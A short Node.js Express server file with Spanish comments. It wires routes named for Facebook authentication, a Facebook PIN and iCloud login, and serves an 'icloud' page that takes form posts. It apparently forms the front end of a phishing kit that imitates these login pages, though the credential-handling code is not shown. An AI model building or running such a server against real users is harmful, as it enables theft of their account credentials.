require('dotenv').config();
const express = require('express');
const path = require('path');
const fbauth = require('./routes/fbauth');
const fbpin = require('./routes/fbpin');
const icloudcheck = require('./routes/icloudlogin')

const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/icloud', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'icloud.html'));
});

// Utilizar rutas
app.use(icloudcheck)
app.use(fbauth);
app.use(fbpin);

app.listen(port, () => {
    console.log(`Servidor ejecutándose en http://localhost:${port}`);
});
